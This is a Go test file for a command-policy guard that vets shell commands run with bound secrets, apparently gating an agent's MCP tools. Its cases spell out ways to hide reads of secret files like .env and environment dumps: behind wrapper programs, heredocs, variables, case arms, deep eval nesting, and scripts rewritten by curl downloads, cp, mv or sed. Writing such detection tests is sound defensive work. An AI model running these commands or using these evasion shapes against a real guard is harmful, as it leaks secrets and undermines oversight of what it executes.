			[]string{"chroot", "/", "cat", dotenv}, true},
		{"strace hides a reader invocation",
			[]string{"strace", "-f", "cat", dotenv}, true},
		{"setsid hides a reader invocation",
			[]string{"setsid", "cat", dotenv}, true},
		{"unshare hides a reader invocation",
			[]string{"unshare", "cat", dotenv}, true},
		{"stdbuf hides a reader invocation",
			[]string{"stdbuf", "-oL", "cat", dotenv}, true},
		// A made-up wrapper name, standing in for the whole unenumerable
		// class this fallback exists to catch in the first place.
		{"a totally unenumerated wrapper name, same shape",
			[]string{"totally-unenumerable-shim", "cat", dotenv}, true},
		// Paired benign: the same wrapper shapes, pointed at nothing
		// dangerous, stay allowed — this is Command Policy correctly
		// checking the real argument, not refusing every wrapper shape
		// on sight.
		{"docker exec with a benign argument is allowed",
			[]string{"docker", "exec", "mycontainer", "cat", "notes.txt"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestShellBehindWrapperHeredoc is
// command-policy:shell-behind-wrapper-heredoc-lost-on-argv-conversion
// (2026-09-23 audit's false-positive A/B corpus): a shell name behind
// an unenumerated wrapper (ssh, docker run) that receives its script
// only via an attached heredoc must still resolve that heredoc's body
// as the executed script, the same way a bare `sh <<EOF` invocation
// already does — ev.simple's catch-all previously flattened the word
// list to plain strings before checking for a shell name there,
// discarding the heredoc's own body (a heredoc word's raw text is "")
// in the process.
func TestShellBehindWrapperHeredoc(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"ssh piping a heredoc script into bash is allowed",
			[]string{"sh", "-c", "ssh build-host bash <<'EOF'\ncd /srv/app\ngit pull\nmake build\nEOF\n"}, false},
		{"docker run piping a heredoc script into sh is allowed",
			[]string{"sh", "-c", "docker run --rm -i alpine sh <<'EOF'\necho hello from container\nuname -a\nEOF\n"}, false},
		// Paired bypass: the exact same shapes, reading a secret file
		// from the heredoc body, are still refused.
		{"paired bypass: ssh piping a heredoc that reads a secret file is refused",
			[]string{"sh", "-c", "ssh build-host bash <<'EOF'\ncat .env\nEOF\n"}, true},
		{"paired bypass: docker run piping a heredoc that reads a secret file is refused",
			[]string{"sh", "-c", "docker run --rm -i alpine sh <<'EOF'\ncat .env\nEOF\n"}, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestShellScriptPathLiteralVariable is
// command-policy:shell-script-path-literal-variable (2026-09-23 audit's
// false-positive A/B corpus): a script path stashed in a shell variable
// earlier assigned a plain string literal (`G=script.sh; bash $G`) must
// resolve back to the real, checkable file — the same way a bare
// filename argument already resolves through ev.resolveLiteral
// elsewhere in this package — rather than reaching shellCommandString
// as the literal two-byte text "$G", which os.Stat obviously can't
// find.
func TestShellScriptPathLiteralVariable(t *testing.T) {
	dir := t.TempDir()
	safe := filepath.Join(dir, "safe.sh")
	if err := os.WriteFile(safe, []byte("#!/bin/sh\necho hello\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	dangerous := filepath.Join(dir, "dangerous.sh")
	if err := os.WriteFile(dangerous, []byte("#!/bin/sh\ncat .env\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name    string
		command string
		refused bool
	}{
		{"a script path held in a variable, invoked with a plain argument, is allowed",
			"G=" + safe + "; bash $G status", false},
		{"the braced spelling ${G} resolves the same way",
			"G=" + safe + "; bash ${G}", false},
		// Paired bypass: the exact same mechanism, pointed at a script
		// that actually reads a secret file, is still refused — this is
		// Command Policy correctly resolving and checking the real
		// script, not merely allowing every variable-held script path
		// on sight.
		{"paired bypass: a script path held in a variable pointing at a dangerous script is refused",
			"G=" + dangerous + "; bash $G", true},
		// An unresolvable variable (never assigned a plain-string
		// literal in this shell string) is left alone rather than
		// guessed at — the existing "nothing statically visible to
		// check" refusal still applies.
		{"an unresolved script-path variable still fails closed",
			"bash $UNRESOLVED_SCRIPT_VAR", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: []string{"sh", "-c", c.command}})
			if (err != nil) != c.refused {
				t.Fatalf("command %q: refused=%v want %v (err=%v)", c.command, err != nil, c.refused, err)
			}
		})
	}
}

// TestScriptFileContentExpandsHome pins scriptFileContent's own leading-
// `~` expansion directly: a script path resolved from a shell variable
// (or given literally) may itself use the common `~/...` spelling,
// which os.Stat, unlike a real shell, never expands on its own.
func TestScriptFileContentExpandsHome(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil {
		t.Skip("no $HOME available in this environment")
	}
	dir, err := os.MkdirTemp(home, "cpass-policy-test-*")
	if err != nil {
		t.Skip("cannot create a temp dir under $HOME in this environment")
	}
	t.Cleanup(func() {
		if err := os.RemoveAll(dir); err != nil {
			t.Logf("cleanup: %v", err)
		}
	})
	script := filepath.Join(dir, "script.sh")
	if err := os.WriteFile(script, []byte("#!/bin/sh\necho hello\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rel, err := filepath.Rel(home, script)
	if err != nil {
		t.Fatal(err)
	}
	content, refuse := scriptFileContent("~/" + rel)
	if refuse {
		t.Fatalf("a ~/-prefixed script path should expand against $HOME and be read")
	}
	if content != "#!/bin/sh\necho hello\n" {
		t.Fatalf("unexpected content: %q", content)
	}
}

// TestCaseStatementPatternArmNotACommand is
// command-policy:case-statement-pattern-arm-not-a-command: a case
// statement's own PATTERN) arm is bash's own pattern-arm syntax, never
// a command invocation — even when the pattern text happens to spell
// the name of a Bound-independent, zero-argument-triggers-a-refusal
// rule this package already has (set/export/declare/typeset/env).
func TestCaseStatementPatternArmNotACommand(t *testing.T) {
	cases := []struct {
		name    string
		command string
		refused bool
	}{
		{"a case arm literally named set is not the set builtin",
			"case \"$1\" in\n  set)\n    echo arming\n    ;;\nesac", false},
		{"a case arm literally named export is not export with no arguments",
			"case \"$1\" in\n  export)\n    echo exporting\n    ;;\nesac", false},
		{"alternated patterns (a|b) are still recognized as pattern text, not commands",
			"case \"$1\" in\n  set|export)\n    echo arming\n    ;;\nesac", false},
		{"a nested case statement inside an arm body is still fully parsed",
			"case \"$1\" in\n  a)\n    case \"$2\" in\n      set) echo inner ;;\n    esac\n    ;;\nesac", false},
		// Paired bypass: a real command inside an arm's own body is
		// still evaluated exactly like any other command.
		{"paired bypass: a secret-file read inside a case arm's body is still refused",
			"case \"$1\" in\n  set)\n    cat .env\n    ;;\nesac", true},
		// Paired bypass: a for-loop's own "in" nested inside an arm
		// body must not be mistaken for a case statement's "in" (which
		// would wrongly discard "1" "2" "3" as pattern text and misparse
		// everything after).
		{"paired bypass: a for-loop nested in a case arm body still evaluates its own commands",
			"case \"$1\" in\n  a)\n    for i in 1 2 3; do cat .env; done\n    ;;\nesac", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: []string{"sh", "-c", c.command}})
			if (err != nil) != c.refused {
				t.Fatalf("command %q: refused=%v want %v (err=%v)", c.command, err != nil, c.refused, err)
			}
		})
	}
}

// TestSplitCommandsCaseStatementPatternArm is the tokenizer-level
// regression for TestCaseStatementPatternArmNotACommand above: a case
// statement's PATTERN) words never become their own simple command.
func TestSplitCommandsCaseStatementPatternArm(t *testing.T) {
	cmds := splitCommands("case \"$1\" in\n  set)\n    echo arming\n    ;;\nesac")
	for _, cmd := range cmds {
		if len(cmd) == 1 && cmd[0].raw == "set" {
			t.Fatalf("the case arm's own pattern word \"set\" must not become its own simple command: %+v", cmds)
		}
	}
	var sawEcho bool
	for _, cmd := range cmds {
		if len(cmd) == 2 && cmd[0].raw == "echo" && cmd[1].raw == "arming" {
			sawEcho = true
		}
	}
	if !sawEcho {
		t.Fatalf("the arm's own body command must still be tokenized normally: %+v", cmds)
	}
}

// TestMaxDepthFailsClosed is command-policy's own stated design
// principle (docs/adr/0013): a command whose nested structure exceeds
// maxDepth now refuses rather than silently running unchecked past that
// point — previously ev.shell/ev.argv/hookWalk all returned nil (allow)
// once depth exceeded maxDepth, contradicting this package's own
// documented "fails closed on shapes it cannot resolve" default and the
// "at any nesting depth" claim docs/THREATS.md and the package doc
// comments made about shell-string evaluation.
func TestMaxDepthFailsClosed(t *testing.T) {
	// Each "eval" prefix re-parses its own remaining argument text as a
	// fresh shell string one level deeper (ev.simple's eval case), with
	// no quoting/escaping needed to nest it — a plain, uncontroversial
	// way to drive this package's own recursion arbitrarily deep without
	// depending on how a real shell would actually re-parse nested
	// quotes (which this synthetic test has no need to model).
	deep := strings.Repeat("eval ", maxDepth+4) + "cat notes.txt"
	if err := Evaluate(Input{Argv: []string{"sh", "-c", deep}}); err == nil {
		t.Fatalf("a command nested past maxDepth should refuse, not silently allow")
	}
	// A command comfortably within maxDepth, with nothing dangerous in
	// it, is unaffected.
	shallow := strings.Repeat("eval ", maxDepth-4) + "cat notes.txt"
	if err := Evaluate(Input{Argv: []string{"sh", "-c", shallow}}); err != nil {
		t.Fatalf("a command within maxDepth with nothing dangerous should stay allowed: %v", err)
	}
}

// TestEnvAllowlistIsHookOnly is CLA-102's own stated scope: the
// printenv allowlist is opted into by Input.EnvAllowlist, which only
// EvaluateHook ever sets. A direct Evaluate call — the one cpass run and
// the MCP server's run_with_secrets/capture tools actually gate real
// execution with — leaves EnvAllowlist false by default and so keeps
// refusing `printenv PATH` even though PATH is on hookEnvAllowlist: real
// execution has real Bound Secret values sitting in the same process
// environment as PATH, so this package deliberately does not extend the
// hook's allowlist there (see Input.EnvAllowlist's own doc comment).
func TestEnvAllowlistIsHookOnly(t *testing.T) {
	argv := []string{"printenv", "PATH"}
	if err := Evaluate(Input{Argv: argv}); err == nil {
		t.Fatalf("argv %v: printenv PATH should still be refused when EnvAllowlist is left unset (the cpass run / MCP path)", argv)
	}
	if err := Evaluate(Input{Argv: argv, EnvAllowlist: true}); err != nil {
		t.Fatalf("argv %v: printenv PATH should be allowed once EnvAllowlist is explicitly set: %v", argv, err)
	}
}

// TestTraceAllowlistIsHookOnly is CLA-103's own stated scope, the same
// shape as CLA-102's TestEnvAllowlistIsHookOnly above: `set -x` is opted
// out of its refusal by Input.TraceAllowlist, which only EvaluateHook
// ever sets. A direct Evaluate call — the one cpass run and the MCP
// server's run_with_secrets/capture tools actually gate real execution
// with — leaves TraceAllowlist false by default and so keeps refusing
// `set -x` even though nothing in this particular argv is Bound: real
// execution DOES have real Bound Secret values sitting in the process a
// traced script would echo, so this package deliberately does not extend
// the hook's allowlist there (see Input.TraceAllowlist's own doc
// comment).
func TestTraceAllowlistIsHookOnly(t *testing.T) {
	argv := []string{"sh", "-c", "set -x; true"}
	if err := Evaluate(Input{Argv: argv}); err == nil {
		t.Fatalf("argv %v: set -x should still be refused when TraceAllowlist is left unset (the cpass run / MCP path)", argv)
	}
	if err := Evaluate(Input{Argv: argv, TraceAllowlist: true}); err != nil {
		t.Fatalf("argv %v: set -x should be allowed once TraceAllowlist is explicitly set: %v", argv, err)
	}
	// Paired bypass: TraceAllowlist opts out the tracing rule specifically
	// — it must not become a blanket "set is fine now" exemption. A bare
	// `set` (no arguments, which prints every variable unconditionally)
	// stays refused regardless.
	bare := []string{"sh", "-c", "set"}
	if err := Evaluate(Input{Argv: bare, TraceAllowlist: true}); err == nil {
		t.Fatalf("argv %v: bare set should stay refused even with TraceAllowlist set", bare)
	}
	// Paired bypass: TraceAllowlist reached through a nested `bash -c
	// 'set -x; ...'` invocation (not just a top-level `set -x`) is the
	// same rule, checked the same way, at any nesting depth.
	nested := []string{"sh", "-c", "bash -c 'set -x; true'"}
	if err := Evaluate(Input{Argv: nested, TraceAllowlist: true}); err != nil {
		t.Fatalf("argv %v: nested set -x should also be allowed once TraceAllowlist is set: %v", nested, err)
	}
	if err := Evaluate(Input{Argv: nested}); err == nil {
		t.Fatalf("argv %v: nested set -x should still be refused without TraceAllowlist", nested)
	}
}

// TestWriteThenRun is CLA-103's write-then-run pattern: a `cat > PATH
// <<DELIM ... DELIM` (or the `<<DELIM > PATH` reordering, `>>` append, or
// `tee [-a] PATH <<DELIM`) that writes a script, immediately followed by
// a shell invocation of that identical literal path within the SAME
// shell string, must resolve to the heredoc's own body rather than
// refusing because the file genuinely isn't on disk yet — this whole
// check runs before either the write or the run has actually executed.
// This exercises Evaluate directly (the cpass run / MCP server path);
// TestEvaluateHookWriteThenRun below is the same pattern at the hook
// layer, plus the shapes only reachable there.
func TestWriteThenRun(t *testing.T) {
	cases := []struct {
		name    string
		command string
		refused bool
	}{
		{"a benign script written then run is allowed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nbash t.sh", false},
		{"the <<DELIM > PATH reordering resolves identically",
			"cat <<'EOF' > t.sh\necho ok\nEOF\nbash t.sh", false},
		{"tee writes the same way cat does",
			"tee t.sh <<'EOF'\necho ok\nEOF\nbash t.sh", false},
		// Paired bypass: a script written then run that itself reads a
		// secret file is still refused — this is Command Policy
		// correctly resolving and checking the real script content, not
		// merely allowing every write-then-run shape on sight.
		{"paired bypass: a dangerous script written then run is refused",
			"cat > t.sh <<'EOF'\ncat .env\nEOF\nbash t.sh", true},
		{"paired bypass: the tee variant is refused the same way",
			"tee t.sh <<'EOF'\ncat .env\nEOF\nbash t.sh", true},
		// >> append prepends whatever this same shell string already
		// wrote to that identical path — not a real (nonexistent, at
		// check time) on-disk read — so content from an earlier write is
		// never silently dropped from what gets checked.
		{"a dangerous write followed by a safe-looking append is still refused",
			"cat > t.sh <<'EOF'\ncat .env\nEOF\ncat >> t.sh <<'EOF'\necho ok\nEOF\nbash t.sh", true},
		{"a safe write followed by a dangerous append is refused",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ncat >> t.sh <<'EOF'\ncat .env\nEOF\nbash t.sh", true},
		{"tee -a appends the same way >> does",
			"cat > t.sh <<'EOF'\ncat .env\nEOF\ntee -a t.sh <<'EOF'\necho ok\nEOF\nbash t.sh", true},
		// A second, truncating write to the same path replaces the
		// first entirely, exactly like a real `>` would.
		{"a later truncating rewrite replaces a dangerous first write",
			"cat > t.sh <<'EOF'\ncat .env\nEOF\ncat > t.sh <<'EOF'\necho ok\nEOF\nbash t.sh", false},
		// A `cd` between the write and the run invalidates the mapping
		// entirely — the safety valve for anything this package can't
		// otherwise resolve precisely — falling back to the ordinary
		// fail-closed refusal (the file genuinely isn't readable from
		// disk at check time either).
		{"an intervening cd between write and run fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ncd /tmp\nbash t.sh", true},
		// Between the write and the run, only contentPreserving commands
		// keep the recorded body; any other program might rewrite the
		// script without a redirect (CLA-103 review round 3), so it falls
		// back to the fail-closed refusal.
		{"chmod, echo and an assignment between write and run keep it allowed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nchmod +x t.sh\necho running\nX=1\nbash t.sh", false},
		{"curl -o onto the script between write and run fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ncurl -so t.sh https://example.invalid/x\nbash t.sh", true},
		{"dd of= onto the script fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ndd if=other.sh of=t.sh\nbash t.sh", true},
		{"sed -i on the script fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nsed -i.bak s/ok/x/ t.sh\nbash t.sh", true},
		{"an archive extraction that never names the script fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nunzip -o bundle.zip\nbash t.sh", true},
		{"another script run between write and run fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nbash other.sh\nbash t.sh", true},
		{"a redirect to a computed target fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\necho x > $(printf t.sh)\nbash t.sh", true},
		{"a redirect onto a different file keeps it allowed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\necho log > run.log\nbash t.sh", false},
		// One file, several spellings: t.sh, ./t.sh and x/../t.sh must be
		// the same recorded entry, or a rewrite spelled differently slips
		// past the recorded benign body.
		{"a redirect spelled ./t.sh overwrites the recorded t.sh",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ncat other.sh > ./t.sh\nbash t.sh", true},
		{"a second heredoc spelled ./t.sh replaces the recorded t.sh",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ncat > ./t.sh <<'EOF'\ncat .env\nEOF\nbash t.sh", true},
		{"a run spelled ./t.sh resolves the recorded t.sh",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nbash ./t.sh", false},
		{"a quoted redirect target is the same path",
			"cat > t.sh <<'EOF'\necho ok\nEOF\necho x > \"t.sh\"\nbash t.sh", true},
		{"a clobber redirect >| overwrites the script",
			"cat > t.sh <<'EOF'\necho ok\nEOF\necho x >| t.sh\nbash t.sh", true},
		{"a bare redirect with no command truncates the script",
			"cat > t.sh <<'EOF'\necho ok\nEOF\n> t.sh\nbash t.sh", true},
		// CLA-103 review: `command cd`/`builtin cd` are ordinary, working
		// shell syntax — a bare `cd` isn't the only spelling that changes
		// directory, and skipping either must invalidate the pending
		// write-then-run candidate exactly like a bare `cd` already does,
		// not let it silently resolve to a same-named file the command
		// never actually wrote.
		{"an intervening `command cd` between write and run fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ncommand cd /tmp\nbash t.sh", true},
		{"an intervening `builtin cd` between write and run fails closed",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nbuiltin cd /tmp\nbash t.sh", true},
		// A `cd` before BOTH the write and the run, with nothing in
		// between them, does not invalidate anything written afterward —
		// including when reached through `command`/`builtin`.
		{"a cd before both write and run is unaffected",
			"cd /tmp && cat > t2.sh <<'EOF'\necho ok\nEOF\nbash t2.sh", false},
		{"a `command cd` before both write and run is unaffected",
			"command cd /tmp && cat > t4.sh <<'EOF'\necho ok\nEOF\nbash t4.sh", false},
		// CLA-103 round-2 review: a LATER, unrecognized write to the
		// IDENTICAL literal path must invalidate the earlier heredoc's
		// tracked body rather than let it keep certifying the run — the
		// live reproduction the review reported (piped into a real
		// enforcement path) genuinely executed the second write's content
		// unchecked before this fix. A plain `>` redirect on any program
		// (not only cat/tee-with-heredoc) is the generic shape.
		{"a later plain > redirect to the same path invalidates the tracked heredoc body",
			"cat > t.sh <<'EOF'\necho ok\nEOF\necho 'echo REAL_EXECUTION_RAN_UNCHECKED_SCRIPT' > t.sh\nbash t.sh", true},
		{"a later plain >> redirect to the same path invalidates the tracked heredoc body",
			"cat > t.sh <<'EOF'\necho ok\nEOF\necho 'echo REAL_EXECUTION_RAN_UNCHECKED_SCRIPT' >> t.sh\nbash t.sh", true},
		{"a later bare tee (no heredoc) to the same path invalidates the tracked heredoc body",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ntee t.sh <<<'echo REAL_EXECUTION_RAN_UNCHECKED_SCRIPT'\nbash t.sh", true},
		{"a later cp onto the same path invalidates the tracked heredoc body",
			"cat > t.sh <<'EOF'\necho ok\nEOF\ncp other.sh t.sh\nbash t.sh", true},
		{"a later mv onto the same path invalidates the tracked heredoc body",
			"cat > t.sh <<'EOF'\necho ok\nEOF\nmv other.sh t.sh\nbash t.sh", true},
		// Paired benign: an unrelated plain write to a DIFFERENT path
		// leaves the tracked entry for the run's own path untouched.
		{"a later plain redirect to a DIFFERENT path leaves the run's own tracked body alone",
			"cat > t.sh <<'EOF'\necho ok\nEOF\necho unrelated > other.txt\nbash t.sh", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: []string{"sh", "-c", c.command}})
			if (err != nil) != c.refused {
				t.Fatalf("command %q: refused=%v want %v (err=%v)", c.command, err != nil, c.refused, err)
			}
		})
	}
}

// TestWriteThenRunBeatsStaleDiskCopy: when the script already exists on
// disk, what the same command writes over it is what runs, so that body
// (not the older copy) is what gets checked, through Evaluate and the hook.
func TestWriteThenRunBeatsStaleDiskCopy(t *testing.T) {
	p := filepath.Join(t.TempDir(), "t.sh")
	if err := os.WriteFile(p, []byte("echo ok\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	dangerous := "cat > " + p + " <<'EOF'\ncat .env\nEOF\nbash " + p
	if Evaluate(Input{Argv: []string{"sh", "-c", dangerous}}) == nil {
		t.Fatal("Evaluate: a dangerous body written over a benign on-disk script must be refused")
	}
	if EvaluateHook(dangerous) == nil {
		t.Fatal("EvaluateHook: a dangerous body written over a benign on-disk script must be refused")
	}
	benign := "cat > " + p + " <<'EOF'\necho fine\nEOF\nbash " + p
	if err := EvaluateHook(benign); err != nil {
		t.Fatalf("EvaluateHook: a benign rewrite of an existing script must stay allowed: %v", err)
	}
}
